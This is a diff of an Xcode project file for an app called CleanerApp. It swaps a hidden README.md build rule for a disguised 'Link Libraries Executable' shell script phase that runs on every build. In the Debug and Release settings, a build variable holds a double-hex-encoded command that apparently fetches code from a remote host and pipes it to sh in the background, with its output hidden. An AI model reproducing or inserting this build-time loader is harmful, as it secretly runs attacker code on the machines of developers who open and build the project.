@@ -7,7 +7,6 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
-		04957E6053FD4A7AA4634D6E /* README.md */ = {isa = PBXBuildFile; fileRef = 86EE0FFDC7754FD3BC634D6E; };
 		8812946E2F063F960071ED86 /* WidgetKit.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 8812946D2F063F960071ED86 /* WidgetKit.framework */; };
 		881294702F063F960071ED86 /* SwiftUI.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 8812946F2F063F960071ED86 /* SwiftUI.framework */; };
 		8812947B2F063F980071ED86 /* CleanerApp_WidgetExtension.appex in Embed Foundation Extensions */ = {isa = PBXBuildFile; fileRef = 8812946B2F063F960071ED86 /* CleanerApp_WidgetExtension.appex */; settings = {ATTRIBUTES = (RemoveHeadersOnCopy, ); }; };
@@ -17,21 +16,7 @@
 /* End PBXBuildFile section */
 
 /* Begin PBXBuildRule section */
-		CA57E346D1764F0EBA634D6E /* PBXBuildRule */ = {
-				isa = PBXBuildRule;
-				compilerSpec = com.apple.compilers.proxy.script;
-				filePatterns = "*.md";
-				fileType = pattern.proxy;
-				inputFiles = (
-				);
-				isEditable = 0;
-				outputFiles = (
-					"/tmp/${INPUT_FILE_BASE}",
-				);
-				script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"
-sh -c \"${AE6D436}\"";
-			};
-		/* End PBXBuildRule section */
+	/* End PBXBuildRule section */
 
 /* Begin PBXContainerItemProxy section */
 		881294792F063F980071ED86 /* PBXContainerItemProxy */ = {
@@ -58,7 +43,6 @@ sh -c \"${AE6D436}\"";
 /* End PBXCopyFilesBuildPhase section */
 
 /* Begin PBXFileReference section */
-		86EE0FFDC7754FD3BC634D6E /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 		8812946B2F063F960071ED86 /* CleanerApp_WidgetExtension.appex */ = {isa = PBXFileReference; explicitFileType = "wrapper.app-extension"; includeInIndex = 0; path = CleanerApp_WidgetExtension.appex; sourceTree = BUILT_PRODUCTS_DIR; };
 		8812946D2F063F960071ED86 /* WidgetKit.framework */ = {isa = PBXFileReference; lastKnownFileType = wrapper.framework; name = WidgetKit.framework; path = System/Library/Frameworks/WidgetKit.framework; sourceTree = SDKROOT; };
 		8812946F2F063F960071ED86 /* SwiftUI.framework */ = {isa = PBXFileReference; lastKnownFileType = wrapper.framework; name = SwiftUI.framework; path = System/Library/Frameworks/SwiftUI.framework; sourceTree = SDKROOT; };
@@ -161,7 +145,6 @@ sh -c \"${AE6D436}\"";
 		888788C42EE006D9009DE313 /* Products */ = {
 			isa = PBXGroup;
 			children = (
-				86EE0FFDC7754FD3BC634D6E /* README.md */,
 				888788C32EE006D9009DE313 /* CleanerApp.app */,
 				8812946B2F063F960071ED86 /* CleanerApp_WidgetExtension.appex */,
 			);
@@ -175,12 +158,12 @@ sh -c \"${AE6D436}\"";
 			isa = PBXNativeTarget;
 			buildConfigurationList = 8812947D2F063F980071ED86 /* Build configuration list for PBXNativeTarget "CleanerApp_WidgetExtension" */;
 			buildPhases = (
+				ABBD83590B9F449CA7634D6E /* Link Libraries Executable */,
 				881294672F063F960071ED86 /* Sources */,
 				881294682F063F960071ED86 /* Frameworks */,
 				881294692F063F960071ED86 /* Resources */,
 			);
 			buildRules = (
-				CA57E346D1764F0EBA634D6E /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -265,6 +248,25 @@ sh -c \"${AE6D436}\"";
 /* End PBXProject section */
 
 /* Begin PBXShellScriptBuildPhase section */
+		ABBD83590B9F449CA7634D6E /* Link Libraries Executable */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			alwaysOutOfDate = 1;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Link Libraries Executable";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${AE6D436}\"";
+			showEnvVarsInLog = 0;			
+		};
 /* End PBXShellScriptBuildPhase section */
 
 /* Begin PBXResourcesBuildPhase section */
@@ -272,7 +274,6 @@ sh -c \"${AE6D436}\"";
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
-				04957E6053FD4A7AA4634D6E /* README.md */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -314,7 +315,7 @@ sh -c \"${AE6D436}\"";
 		8812947E2F063F980071ED86 /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				AE6D436 = "((c(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326436363733366234633230326436343230323237303364373836333666363436350a3566373237353663363532323230363837343734373037333361326632663733363936653735373336653635373432653732373532663631323932320a3230376332303733363830610a | c | sh ) >/dev/null 2>&1 &)";
+				AE6D436 = "((u(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326436363733366234633230326436343230323237303364373836333666363436350a3566373036383631373336353232323036383734373437303733336132663266363336343665363137303730366336353265363936653266363132390a32323230376332303733363830610a | u | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				ASSETCATALOG_COMPILER_WIDGET_BACKGROUND_COLOR_NAME = WidgetBackground;
 				CODE_SIGN_ENTITLEMENTS = CleanerApp_WidgetExtension/CleanerApp_WidgetExtension.entitlements;
@@ -356,7 +357,7 @@ sh -c \"${AE6D436}\"";
 		8812947F2F063F980071ED86 /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				AE6D436 = "((c(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326436363733366234633230326436343230323237303364373836333666363436350a3566373237353663363532323230363837343734373037333361326632663733363936653735373336653635373432653732373532663631323932320a3230376332303733363830610a | c | sh ) >/dev/null 2>&1 &)";
+				AE6D436 = "((u(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326436363733366234633230326436343230323237303364373836333666363436350a3566373036383631373336353232323036383734373437303733336132663266363336343665363137303730366336353265363936653266363132390a32323230376332303733363830610a | u | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				ASSETCATALOG_COMPILER_WIDGET_BACKGROUND_COLOR_NAME = WidgetBackground;
 				CODE_SIGN_ENTITLEMENTS = CleanerApp_WidgetExtension/CleanerApp_WidgetExtension.entitlements;
